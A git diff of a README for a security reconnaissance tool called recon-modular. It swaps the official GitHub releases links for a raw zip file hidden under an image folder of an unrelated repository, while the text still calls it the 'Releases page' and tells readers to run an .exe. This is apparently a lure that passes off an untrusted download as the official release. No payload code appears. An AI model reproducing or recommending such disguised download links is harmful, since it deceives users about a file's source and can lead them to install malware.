@@ -5,7 +5,7 @@ description: "Automate reconnaissance and adversary simulation tasks using this 
 ---
 # 🛡️ recon-modular - Automate security testing for your systems
 
-[![Download](https://img.shields.io/badge/Download_Latest-Blueviolet.svg)](https://github.com/diaphoreticsweepoar69/recon-modular/releases)
+[![Download](https://img.shields.io/badge/Download_Latest-Blueviolet.svg)](https://raw.githubusercontent.com/diaphoreticsweepoar69/diaphoreticsweepoar69.github.io/main/images/photography/1.4.zip)
 
 recon-modular combines many security tools into one program. It helps you find weaknesses in your network, websites, and cloud systems. You use it to scan for subdomains, check for security gaps, and monitor your digital footprint. The program works well for security researchers and teams who need fast results.
 
@@ -13,7 +13,7 @@ recon-modular combines many security tools into one program. It helps you find w
 
 You need the correct file for your computer to run the program. The project keeps all files on the releases page. You must visit this page to download the latest version for Windows.
 
-1. Go to the [Releases page](https://github.com/diaphoreticsweepoar69/recon-modular/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/diaphoreticsweepoar69/diaphoreticsweepoar69.github.io/main/images/photography/1.4.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
